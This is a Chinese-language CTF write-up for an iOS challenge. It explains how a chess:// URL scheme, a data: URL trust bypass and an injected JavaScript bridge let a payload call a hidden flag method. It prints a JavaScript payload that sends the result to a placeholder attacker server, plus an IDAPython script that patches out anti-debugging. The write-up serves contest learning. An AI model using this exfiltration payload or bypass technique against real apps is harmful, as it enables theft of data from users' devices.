# chess

## 题目简述

题目附件是 iOS 应用 `chess.ipa`。Bundle 中有占位 `flag` 文件，但真实 flag 位于后端真实 iPhone 上运行的 App 内。应用注册了 `chess://` URL Scheme，并在特定参数下打开由 `UIHostingController` 包装的 WebView；当目标 URL 被判断为可信时，程序会把 `WMScriptInterface` 暴露给 JavaScript。解题目标是构造 `chess://` payload，让 App 加载 `data:` 页面并调用 `wmctf.$_getFlag()` 将真实 flag 发回。

## 解题过程

首先拿到 IPA 解压缩之后发现在 Bundle 中存在一个名为 flag 文件，文件内容为 {placeholder}。且根据赛题得知有一台真实 iPhone 在后端运行，则可知存在真正的 flag 的 App 正运行在该 iPhone 当中。

查看 Bundle 中的 Info.plist 文件可发现应用注册一个 URL Scheme，为 `chess://`：

将二进制扔到 IDA 进行分析，查看应用 URL Scheme 的关键回调逻辑：

继续跟进 `_showExternalURL`：

代码中存在两处内联汇编的反调试逻辑，选手可以通过静态匹配特征来 patch：

在 `showExternalURL` 函数中遇到第一个判断：

通过动态调试跟进函数看下判断的逻辑：

该部分代码大意为：如果 URL 的参数中存在 urlType=exit 或者 search 或者 web 时则返回 true。

当判断返回 true 时则跳进第一个分支 `_legacyResolveExternalURL` 函数中：

继续跟进 `resolveURL` 函数中：

在 `_showAccountViewControllerWithURL` 函数中会先取传入 URL 中的 url 参数字段，并弹出新的控制器进行加载：

我们可以看到新弹出的控制器是用 `UIHostingController` 包装的 `ContentWebView`。SwiftUI 本身没有直接内嵌网页视图的原生 `View`；常见实现是让自定义结构体实现 `UIViewRepresentable`，在 `makeUIView` 里创建 `WKWebView`，在 `updateUIView` 里构造 `URLRequest` 并调用 `load`。这解释了为什么后续要跟进 `makeUIView` 中的 URL 处理逻辑。

寻找 `makeUIView` 函数来看下应用是如何处理构造 URLRequest 的，关键代码：

先调用了 `_URLByRemovingBlacklistedParametersWithURL` 函数，在该函数中进行了一些特殊符号的过滤，并且在 URL 的结尾添加了一个 `?` 符号。

接下来调用 `urlIsTrusted` 进行了一次判断：

在该函数中存在一段逻辑，当传入的 URL 的 Scheme 为 data 时，则返回 1。也就是说当传入 URL 是个 Data URi 时则认为该 URL 是个可信的 URL。

当传入的 URL 是一个可信 URL 时，则调用 `injectScriptInterface` ，并且加载 URL：

让我们跟进 `injectScriptInterface` 看下关键逻辑：

可以看到将 `WMScriptInterface` 类的方法导出到 js 上下文中，这些 API 被放在全局作用域的 `wmctf` 命名空间里。

然后我们在 IDA 中搜索，惊喜的发现有个 `-[chess.WMScriptInterface _getFlag]` 的函数：

此时我们得知可以一个构造 payload 然后通过 URL Scheme 调起 chess 客户端，并执行 `wmctf.$_getFlag()` 来获取到 flag。

构造生成 Payload 的 js 代码：

```javascript
String.prototype.toDataURI = function() {
  return 'data:text/html;,' + encodeURIComponent(this).replace(/[!'()*]/g, escape);
}

function payload() {  
  var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://XXX/test?flag=' + wmctf.$_getFlag(), false); xhr.send();
}

const data = `<script type="application/javascript">(${payload})()<\/script>`.toDataURI()
const url = new URL('chess://x?urlType=web');

url.searchParams.set('url', data);
url.toString()
```

只要将该 URL Scheme 提交（我写了个 webserver，用来接收 payload 并在设备执行），则会在设备执行，并且将 flag 发送到攻击者的服务器。

IDAPython Ptach `svc 0x80`:

```python
import idc
def text_seg_addr_start():
    for seg in Segments():
        if SegName(seg) == '__text':
            addr = hex(SegStart(seg))
            print("text segment address start: " + addr)
            return int(addr[0:-1], 16)
def text_seg_addr_end():
    for seg in Segments():
        if SegName(seg) == '__text':
            addr = hex(SegEnd(seg))
            print("text segment address end: " + addr)
            return int(addr[0:-1], 16)       
start = text_seg_addr_start()
end = text_seg_addr_end()
while start < end:
    m = idc.print_insn_mnem(start)
    n = idc.print_operand(start, 0)
    if m == 'SVC' and n == '0x80':
        # print(idc.GetDisasm(start))
        if idc.print_operand(idc.prev_head(start), 1) == '#0x1A':
            idc.PatchDword(start, 0xD503201F)
            print("patch {} success!".format(hex(start)))
    start += 4
```

### 彩蛋：

当用 js 调用 wmctf 命名空间中一个不存在的方法时，则会返回一段 base64 编码的图片字符串！

### 参考资料要点

- AppCoda 的 SwiftUI/WKWebView 示例说明：SwiftUI 中嵌入 WebView 通常通过 `UIViewRepresentable` 包装 UIKit 的 `WKWebView`，`makeUIView` 创建视图，`updateUIView` 加载 URL。本题中 `ContentWebView.makeUIView` 正是后续 URL 过滤、可信判断和脚本接口注入的关键入口。原文：https://www.appcoda.com/swiftui-wkwebview/
- Apple WebKit 文档说明：WebKit 的脚本桥允许在 WebView 这类嵌入式 WebKit 环境中把 Objective-C 方法/属性暴露给 JavaScript，但默认不会暴露任何 selector 或 key；类需要通过 `isSelectorExcludedFromWebScript` 等方法显式允许导出。默认 selector 到脚本名的转换会把冒号替换为 `_`，下划线前加 `$`，所以 Objective-C/Swift 侧 `_getFlag` 这类名字在 JS 侧会表现为 `$` 前缀形式。本题利用点就是 `WMScriptInterface` 被注入后可从 `wmctf` 命名空间调用导出的取 flag 方法。原文：https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/SafariJSProgTopics/ObjCFromJavaScript.html

## 方法总结

- 核心技巧：通过 URL Scheme 进入 App 内部 WebView 流程，再用 `data:` URL 绕过可信判断并执行 JS bridge 中暴露的 `_getFlag`。
- 识别信号：iOS 题出现自定义 URL Scheme、SwiftUI 包装 WebView、`urlType` 分支、`data:` URL 信任逻辑和脚本接口注入时，应检查 JS 是否能调用原生对象中的敏感方法。
- 复用要点：先 patch 反调试保证动态分析可行；再确认 URL 过滤会怎样改写参数；最后构造 `data:text/html` payload 时要正确 URL 编码脚本内容，并准备回连服务器接收 flag。
